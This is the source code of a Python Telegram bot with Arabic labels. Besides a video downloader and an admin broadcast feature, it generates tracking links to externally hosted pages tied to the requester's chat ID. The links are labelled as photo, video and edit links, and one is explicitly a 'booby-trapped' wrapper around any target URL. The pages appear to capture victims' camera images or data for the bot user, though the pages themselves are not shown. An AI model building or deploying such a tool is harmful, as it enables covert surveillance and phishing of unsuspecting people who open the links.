import os
import urllib3
import telebot
from telebot import types
import threading
import http.server
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = "8169635171"
bot = telebot.TeleBot(BOT_TOKEN)

# الروابط
PHOTO_PAGE = "https://app-display.github.io/ca.html-chatld-/" 
INJECT_PAGE = "https://app-display.github.io/ca.html-chatld2/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}

# --- حفظ المستخدمين للإعلان ---
def save_user(chat_id):
    try:
        with open("users.txt", "a") as f:
            f.write(f"{chat_id}\n")
    except: pass

def get_users():
    if not os.path.exists("users.txt"): return []
    with open("users.txt", "r") as f:
        return list(set(f.read().splitlines()))

# --- السيرفر للبقاء نشطاً ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- دالة التحميل ---
def download_video_sync(url, chat_id):
    try:
        file_path = f'/tmp/vid_{chat_id}.mp4'
        ydl_opts = {
            'format': 'best', 'outtmpl': file_path, 'quiet': True,
            'no_warnings': True, 'cookiefile': 'cookies.txt',
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'geo_bypass': True
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            if os.path.exists(file_path): os.remove(file_path)
            info = ydl.extract_info(url, download=True)
            return file_path, info.get('title', 'Video')
    except Exception as e: return None, str(e)

# --- القائمة (معدلة لتطابق الصورة 118414.jpg) ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
        types.InlineKeyboardButton("💣 تلقيم رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    save_user(message.chat.id)
    bot.send_message(message.chat.id, "👋 أهلاً بك، تم تحديث البوت.\n\nاختر من القائمة:", reply_markup=get_main_keyboard())

# --- ميزة الإعلان ---
@bot.message_handler(commands=['announce'])
def announce(message):
    if str(message.chat.id) == ADMIN_ID:
        users = get_users()
        bot.reply_to(message, f"📢 جاري الإرسال لـ {len(users)} مستخدم...")
        for uid in users:
            try: bot.send_message(uid, "📢 إعلان من الإدارة: تم تحديث البوت بنجاح!")
            except: continue
        bot.reply_to(message, "✅ تم الإرسال للجميع.")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    if call.data == "news_menu":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔴 الجزيرة مباشر", url="https://www.aljazeera.net/live"))
        bot.edit_message_text("🌐 البث المباشر:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_inject"
        bot.edit_message_text("💣 أرسل الرابط الذي تريد تلغيمه:", chat_id, call.message.message_id)
    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ رابط الصور:\n{PHOTO_PAGE}?chatId={chat_id}")
    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 رابط الفيديو:\n{VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ رابط التعديل:\n{IMAGE_EDIT_URL}?chatId={chat_id}")
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    if state == "waiting_for_inject":
        target = message.text if message.text.startswith("http") else f"https://{message.text}"
        bot.reply_to(message, f"✅ تم التلغيم:\n{INJECT_PAGE}?target={target}&chatId={chat_id}")
        user_states[chat_id] = None
    elif state == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري التحميل...")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            with open(path, 'rb') as v: bot.send_video(chat_id, v, caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            os.remove(path)
        else: bot.edit_message_text(f"❌ فشل: تأكد من ملف cookies.txt", chat_id, status_msg.message_id)
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.infinity_polling()
